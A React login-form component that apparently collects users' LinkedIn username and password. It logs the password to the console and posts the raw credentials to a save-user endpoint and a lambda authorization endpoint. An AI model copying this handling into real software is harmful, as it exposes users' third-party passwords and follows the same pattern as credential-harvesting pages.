'use client'
import { useState } from 'react';

const LoginForm = ({setIsShowPopup, setUserLogin }) => {
  const [login, setLogin] = useState('');
  const [pass, setPass] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    
  
    setUserLogin(login);

    console.log("login", login);
    console.log("pass", pass);
    try {
      const savingUser = await fetch('/api/save-user', {
        method: 'POST',
        headers:{
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({pass, login}),
      });
        
      const { userId } = await savingUser.json()
      
      const linkedinAuthorization = await fetch('/api/lambda-authorize', {
        method: 'POST',
        headers:{
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({pass, login, userId }),
      });

      setIsShowPopup(true)

    } catch (error) {
      console.log("Something went wrong try again letter", error);
    }
  
  };

  return (
    <div>
      <div>
       <form onSubmit={handleSubmit}>
         <input name='login' type="text" value={login} onChange={(e) => setLogin(e.target.value)} />
        <input name='pass' type="password" value={pass} onChange={(e) => setPass(e.target.value)} />
        <button type='submit' >Send</button>
       </form>
      </div>
    </div>
  );
};

export default LoginForm;
